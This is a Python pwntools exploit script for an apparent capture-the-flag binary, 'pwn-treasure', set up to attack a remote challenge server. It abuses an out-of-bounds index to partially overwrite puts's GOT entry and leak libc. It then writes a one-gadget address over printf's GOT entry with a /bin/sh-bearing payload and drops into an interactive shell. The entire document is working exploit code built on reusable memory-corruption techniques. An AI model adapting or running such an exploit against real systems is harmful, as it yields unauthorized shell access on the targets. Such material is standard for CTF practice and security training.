from pwn import *


context(arch='amd64', os='linux', log_level='debug')

elf = ELF('./pwn-treasure')
libc = ELF('./libc.so.6')

host = 'nc1.ctfplus.cn'
port = 41103

bss = 0x40a0
gadget = 0xebd43


def start():
    if args.REMOTE:
        io = remote(host, port)
    else:
        io = process('./pwn-treasure')
    return io


def idx(addr):
    return (addr - bss) // 8


def leak_puts(io):
    io.sendlineafter(b'password: ', b'0')
    io.sendlineafter(b'Which one?\n', str(idx(elf.got['puts'])).encode())

    # gdb.attach(io, 'b *main\nc')
    # pause()
    io.send(p8(libc.sym['puts'] & 0xff))

    io.recvuntil(b'after your operation, the context: ')
    puts_addr = u64(io.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
    io.recvuntil(b'you should tell me your name.\n')
    log.success('puts_addr: ' + hex(puts_addr))
    return puts_addr


def build_name_payload(libc_base):
    payload = flat(
        {
            0x18: 0,
            0x20: 0,
            0x40: libc_base + next(libc.search(b'/bin/sh\x00')),
            0x48: 0,
        },
        filler=b'A',
        length=0x50,
    )
    return payload


def pwn():
    io = start()

    puts_addr = leak_puts(io)
    libc_base = puts_addr - libc.sym['puts']
    log.success('libc_base: ' + hex(libc_base))

    payload = build_name_payload(libc_base)
    io.send(payload + b'\n')

    io.sendlineafter(b'Last time!Lucky, guy!\n', str(idx(elf.got['printf'])).encode())

    # gdb.attach(io, 'b *main\nc')
    # pause()
    io.send(p64(libc_base + gadget))

    io.interactive()


if __name__ == '__main__':
    pwn()
